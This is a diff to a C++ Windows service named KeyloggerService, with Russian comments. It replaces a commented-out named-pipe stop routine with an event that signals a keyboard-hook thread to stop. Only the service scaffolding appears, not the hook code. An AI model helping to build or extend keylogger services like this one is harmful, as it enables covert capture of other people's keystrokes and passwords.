@@ -148,52 +148,6 @@ void KeyloggerService::displayHelp()
     helpFormatter.format(std::cout);
 }
 
-void KeyloggerService::removelKeyboardHookProcess() {
-    //// Создаем дескриптор канала
-    //HANDLE hPipe;
-    //// Имя канала
-    //LPCWSTR pipeName = L"\\\\.\\pipe\\MyNamedPipe";
-    //// Буфер для записи сообщения
-    //const char* message = "stop";
-
-    //// Подключаемся к серверу
-    //while (1)
-    //{
-    //    hPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-    //    if (hPipe != INVALID_HANDLE_VALUE)
-    //    {
-    //        break;
-    //    }
-    //    if (GetLastError() != ERROR_PIPE_BUSY)
-    //    {
-    //        std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
-    //        return;
-    //    }
-    //    // Если все каналы заняты, ждем, пока будет свободен хотя бы один
-    //    if (!WaitNamedPipe(pipeName, 5000))
-    //    {
-    //        std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
-    //        return;
-    //    }
-    //}
-
-    //// Отправляем данные в канал
-    //DWORD bytesWritten;
-    //if (!WriteFile(hPipe, message, strlen(message) + 1, &bytesWritten, NULL))
-    //{
-    //    std::cerr << "Could not write to pipe. Error: " << GetLastError() << std::endl;
-    //    CloseHandle(hPipe);
-    //    return;
-    //}
-
-    //std::cout << "Message sent to server: " << message << std::endl;
-
-    //// Закрываем дескриптор канала
-    //CloseHandle(hPipe);
-
-}
-
-
 int KeyloggerService::main(const std::vector<std::string>& args)
 {
     if (_helpRequested)
@@ -202,16 +156,19 @@ int KeyloggerService::main(const std::vector<std::string>& args)
         return Application::EXIT_OK;
     }
     std::this_thread::sleep_for(std::chrono::seconds(20));
+
+    doneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+
     KeyResolver keyResolver;
     NullGuardProcessor gProcessor;
     WordProcessor wProcessor(&gProcessor);
-    WorkerThread wc(&keyResolver, &wProcessor);
+    WorkerThread wc(doneEvent, &keyResolver, &wProcessor);
     // чтобы мы могли остановить сервис нам нужно CreateHookThread сделать detach
     wc.CreateHookThread();
 
     waitForTerminationRequest();
     // здесь нужно вызвать у HookThread функцию стоп
-    removelKeyboardHookProcess();
+    SetEvent(doneEvent);
 
     return Application::EXIT_OK;
 }
